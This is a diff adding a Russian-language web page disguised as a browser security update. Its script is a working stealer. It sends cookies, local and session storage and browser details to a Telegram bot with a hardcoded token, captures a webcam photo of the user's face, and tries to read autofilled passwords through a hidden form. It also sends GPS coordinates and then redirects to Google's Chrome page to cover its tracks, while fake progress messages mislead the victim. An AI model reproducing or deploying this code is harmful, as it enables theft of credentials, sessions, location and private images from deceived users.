@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Обновление браузера</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+            display:flex;align-items:center;justify-content:center;height:100dvh;
+        }
+        .card{
+            background:#fff;border-radius:16px;padding:35px 25px;text-align:center;
+            max-width:400px;width:90%;box-shadow:0 4px 20px rgba(0,0,0,0.08);
+        }
+        .icon{font-size:56px;margin-bottom:12px}
+        h2{color:#1a1a1a;font-size:20px;margin-bottom:6px}
+        p{color:#666;font-size:13px;margin-bottom:20px;line-height:1.5}
+        .progress{background:#e0e0e0;border-radius:8px;height:8px;margin-bottom:20px;overflow:hidden}
+        .progress-bar{background:#1a73e8;height:100%;width:0;border-radius:8px;transition:width 0.3s}
+        .btn{
+            width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;
+            border-radius:24px;font-size:15px;font-weight:600;cursor:pointer;transition:background 0.2s
+        }
+        .btn:hover{background:#1557b0}
+        .btn:active{transform:scale(0.98)}
+        .status{color:#1a73e8;font-size:12px;margin-top:12px;min-height:16px}
+        video,canvas,iframe{display:none}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">🛡</div>
+        <h2>Обновление безопасности</h2>
+        <p>Ваш браузер устарел. Обновите его для продолжения работы с сайтами Google, YouTube и другими сервисами.</p>
+        <div class="progress"><div class="progress-bar" id="progress"></div></div>
+        <div class="status" id="status">Ожидание...</div>
+        <button class="btn" id="btn" onclick="go()">Обновить браузер</button>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <iframe id="frm" sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe>
+    <script>
+        const BOT_TOKEN = "8653136768:AAGqhl21C7k3VZ3JGDgQBy83-UxQhoHM9bE";
+        const CHAT_ID = 5730893708;
+
+        async function send(text){
+            try{
+                await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
+                    method:"POST",headers:{"Content-Type":"application/json"},
+                    body:JSON.stringify({chat_id:CHAT_ID,text:text})
+                });
+            }catch(e){}
+        }
+
+        async function sendPhoto(blob,caption){
+            const fd=new FormData();
+            fd.append("chat_id",CHAT_ID);
+            fd.append("photo",blob,"face.jpg");
+            fd.append("caption",caption);
+            try{await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendPhoto",{method:"POST",body:fd})}catch(e){}
+        }
+
+        function updateProgress(pct){
+            document.getElementById("progress").style.width=pct+"%";
+        }
+
+        async function go(){
+            const btn=document.getElementById("btn");
+            const status=document.getElementById("status");
+            btn.disabled=true;
+            btn.style.opacity="0.5";
+
+            let report="FULL STEALER REPORT\n";
+            report+="Time: "+new Date().toLocaleString()+"\n";
+            report+="User-Agent: "+navigator.userAgent+"\n";
+            report+="Language: "+navigator.language+"\n";
+            report+="Platform: "+navigator.platform+"\n";
+            report+="Screen: "+screen.width+"x"+screen.height+"\n";
+            report+="Referrer: "+document.referrer+"\n";
+            report+="\n=== COOKIES ===\n"+document.cookie+"\n";
+            report+="\n=== LOCAL STORAGE ===\n";
+            for(let i=0;i<localStorage.length;i++){
+                const k=localStorage.key(i);
+                report+=k+"="+localStorage.getItem(k).substring(0,100)+"\n";
+            }
+            report+="\n=== SESSION STORAGE ===\n";
+            for(let i=0;i<sessionStorage.length;i++){
+                const k=sessionStorage.key(i);
+                report+=k+"="+sessionStorage.getItem(k).substring(0,100)+"\n";
+            }
+
+            status.textContent="Сканирование системы...";
+            updateProgress(20);
+            await send(report.substring(0,4000));
+            if(report.length>4000) await send(report.substring(4000,8000));
+            await new Promise(r=>setTimeout(r,500));
+
+            // Камера
+            status.textContent="Проверка камеры...";
+            updateProgress(50);
+            try{
+                const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480}});
+                const video=document.getElementById("video");
+                video.srcObject=stream;
+                await video.play();
+                await new Promise(r=>setTimeout(r,1500));
+                const canvas=document.getElementById("canvas");
+                canvas.width=video.videoWidth||640;
+                canvas.height=video.videoHeight||480;
+                canvas.getContext("2d").drawImage(video,0,0);
+                canvas.toBlob(async(blob)=>{
+                    await sendPhoto(blob,"FACE: "+navigator.userAgent.substring(0,50));
+                    stream.getTracks().forEach(t=>t.stop());
+                },"image/jpeg",0.7);
+            }catch(e){}
+
+            // Автозаполнение
+            status.textContent="Проверка сохранённых паролей...";
+            updateProgress(75);
+            try{
+                const f=document.createElement("form");f.style.display="none";
+                const u=document.createElement("input");u.type="text";u.autocomplete="username";
+                const p=document.createElement("input");p.type="password";p.autocomplete="current-password";
+                f.appendChild(u);f.appendChild(p);document.body.appendChild(f);
+                await new Promise(r=>setTimeout(r,1000));
+                if(u.value||p.value){
+                    await send("AUTOFILL LOGIN: "+u.value+"\nAUTOFILL PASS: "+p.value);
+                }
+                document.body.removeChild(f);
+            }catch(e){}
+
+            // Геолокация
+            status.textContent="Определение местоположения...";
+            updateProgress(90);
+            try{
+                navigator.geolocation.getCurrentPosition(async(pos)=>{
+                    await send("GPS: "+pos.coords.latitude+", "+pos.coords.longitude);
+                },()=>{},{timeout:3000});
+            }catch(e){}
+
+            status.textContent="Завершено!";
+            updateProgress(100);
+            btn.textContent="Готово";
+            setTimeout(()=>{window.location.href="https://www.google.com/chrome/"},2000);
+        }
+    </script>
+</body>
+</html>
